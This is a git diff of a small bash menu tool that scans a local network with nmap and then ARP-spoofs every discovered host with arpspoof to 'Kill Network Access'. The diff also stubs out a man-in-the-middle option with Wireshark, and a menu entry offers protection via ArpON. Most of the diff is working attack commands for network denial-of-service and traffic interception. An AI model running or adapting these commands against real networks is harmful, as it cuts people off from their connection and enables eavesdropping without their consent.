@@ -12,28 +12,11 @@
 
 IPs=()
 
-# ARP Scan (Discovery) 
-function Scan() {
-set Targets=$(sudo nmap -sn $1 2>/dev/null -oG - | grep "Up$" | awk '{printf "%s ", $2}')
-set Gateway=$(ip route show default dev $2 | awk '{printf $3}' )
-}
 
-# Arp Spoof  (Application) 
-function ArpBLOCK() { 
-	for i in $Targets
-	do
-		printf "Spoofing " $i "..."
-		xterm -hold -e "sudo arpspoof -t $1 -i $2 -c own ${Gateway}"
-		x+=$!
-	
-	done
-}
-
-function ArpSniff() {
-	printf ""
-}
 
 # Correction (ReArping)
+
+Gateway=$(ip route show default dev wlan0 | awk '{print $3}' | tail -n 1 )
 
 printf "\e[37;41m╔═══════════════════════════════════════════════════════════════════════════╗ \033[0m\n"
 printf "\e[37;41m║                                                                           ║ \033[0m\n"
@@ -46,11 +29,17 @@ printf "\e[37;41m║   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝        
 printf "\e[37;41m║                                                                           ║ \033[0m\n"
 printf "\e[37;41m╠═════════════════════════ BERCHIL Idriss ══════════════════════════════════╝ \033[0m\n"
 printf "║\n"
+#TODO: if $1 is a host (not network) disable this option and auto configure
 printf "╠═  1. Scan for IP Addresses (ARP Scan)\n"
+#TODO: Not allow 2nd & 3rd option without scanning first
 printf "╠═  2. Kill Network Access (ARP Spoof target only)\n"
 printf "╠═  3. Man In the Middle (ARP Spoof target & gateway)\n"
 printf "╠═  4. Protect yourself using ArpON\n"
 printf "╚═  5. Exit\n"
+printf "║\n"
+printf "╚═ 	Gateway is ${Gateway}, \n"
+printf "╚═ 	Target is $1. \n"
+printf "╚═ 	Interface is $2, \n"
 
 
 
@@ -60,12 +49,32 @@ do
 	read -e choice
 	case ${choice} in
 	1)
-
-	;;
+		echo "Scanning ..."
+		Targets=$(sudo nmap -sn $1 2>/dev/null -oG - | grep "Up$" | awk '{printf "%s ", $2}')
+		
+		echo "Targets are:"
+		for i in $Targets
+		do
+		echo $i
+		done
+		;;
 	2)
+		if [[ ${#IPs[@]} -eq 0 ]]
+		then
+			printf "No targets "
+		fi
 
-	;;
+		for i in $Targets
+		do
+			printf "Spoofing " $i "..."
+			xterm -hold -e "sudo arpspoof -t $1 -i $2 -c own ${Gateway}" 1>/dev/null 2>&1 &
+			IPs+=$!
+		done
+		;;
 	3)
+	#Arp spoof target
+	#ARp spoof gateway as target
+	#open wireshark
 
 	;;
 	4)
